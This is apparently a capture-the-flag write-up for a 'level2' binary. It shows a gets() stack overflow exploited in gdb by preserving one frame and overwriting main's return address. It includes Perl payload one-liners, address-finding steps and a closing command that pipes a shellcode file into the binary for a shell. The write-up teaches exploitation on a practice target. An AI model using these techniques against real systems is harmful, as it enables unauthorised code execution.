Basically the same as level1, except the return address is checked after `gets`.  It exits early if the return address matches `0xbXXXXXXX`.  This means we can't just return wherever we want.

Our stack is mapped to `0xbffdf000-0xc0000000` (see gdb later), so we can't use that as return address.  libc is mapped to `0xb7e2c000-0xb7fd2000`, we can't use that either.

Come to think of it, no mapped address range is viable except `0x08048000-0x0804a000` which is the program itself.  Since there's no ready-made win path in the program, there's nothing we can do.  At least, in this stack frame.

If we can't change the return address of the current frame, why not change the parent stack frame?  Since the stack grows downwards, the previous stack frame starts and ends at a higher address than the current frame.  If we continue writing, we should be able to overwrite the return address of `main`.  We just need to be careful and not change the saved `ebp` and `eip` of `p`.

Here's the plan:
1. Find saved `ebp` and saved `eip` of `p`
2. Find the address of the stack buffer
3. Write a payload that contains a shell code and overrides the return address of `main`

```
(gdb) set exec-wrapper env -i

(gdb) set disassembly-flavor intel

(gdb) b p
Breakpoint 1 at 0x80484da

(gdb) r < /dev/null
Starting program: /home/user/level2/level2 < /dev/null

Breakpoint 1, 0x080484da in p ()

(gdb) info fr 0
Stack level 0, frame at 0xbffffe50:
 eip = 0x80484da in p; saved eip 0x804854a
 called by frame at 0xbffffe60
 Arglist at 0xbffffe48, args:
 Locals at 0xbffffe48, Previous frame's sp is 0xbffffe50
 Saved registers:
  ebp at 0xbffffe48, eip at 0xbffffe4c

(gdb) info fr 1
Stack frame at 0xbffffe60:
 eip = 0x804854a in main; saved eip 0xb7e454d3
 caller of frame at 0xbffffe50
 Arglist at 0xbffffe58, args:
 Locals at 0xbffffe58, Previous frame's sp is 0xbffffe60
 Saved registers:
  ebp at 0xbffffe58, eip at 0xbffffe5c
```

So saved `eip` is `0x804854a` and saved `ebp` is `0xbffffe58`.

```
(gdb) b *p+
Breakpoint 2 at 0x80484ea

(gdb) c
Continuing.

Breakpoint 2, 0x080484ea in p ()

(gdb) p/x $eax
$1 = 0xbffffdfc
```

And the address of the stack buffer is `0xbffffdfc`.

We can also find the address of the string `/bin/sh` inside of libc to make our lives easier and not include it in our payload:

```
(gdb) info proc mappings
process 5122
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]

(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.

(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

Here is what our stack should look like:

```
| Element   | Size    | Offset | Function |
+-----------+---------+--------+----------+
| buffer    |      76 |      0 | p        |
| ebp       |       4 |     76 | p        |
| eip       |       4 |     80 | p        |
| alignment |       8 |     84 | main     |
| ebp       |       4 |     92 | main     |
| eip       |       4 |     96 | main     |
| <end>     |       0 |    100 | main     |
```

Let's confirm our theory:

```
(gdb) set exec-wrapper env -i

(gdb) set disassembly-flavor intel

(gdb) r < <(perl -e 'print "A" x 76, "ZZZZ", "BBBB"')
Starting program: /home/user/level2/level2 < <(perl -e 'print "A" x 76, "ZZZZ", "BBBB"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAZZZZBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

(gdb) bt
#0  0x42424242 in ?? ()
#1  0x08048500 in p ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```

We have successfully overwritten the return address of `p`.  Now, to overwrite the return address of `main`:

```
(gdb) set exec-wrapper env -i

(gdb) set disassembly-flavor intel

(gdb) r < <(perl -e 'print "A" x 76, pack("L<", 0xbffffe58), pack("L<", 0x0804854a), "P" x 8, "WWWW", "BBBB"')

Starting program: /home/user/level2/level2 < <(perl -e 'print "A" x 76, pack("L<", 0xbffffe58), pack("L<", 0x0804854a), "P" x 8, "WWWW", "BBBB"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAAAX���JPPPPPPPPWWWWBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

(gdb) bt
#0  0x42424242 in ?? ()
#1  0x00000000 in ?? ()
```

And we have successfully overwritten the return address of `main`.  We can now craft a payload that will do what we want.  See `payload.s`, build using `make(1)`.

```
cat /tmp/2 - | env -i ~/level2
```
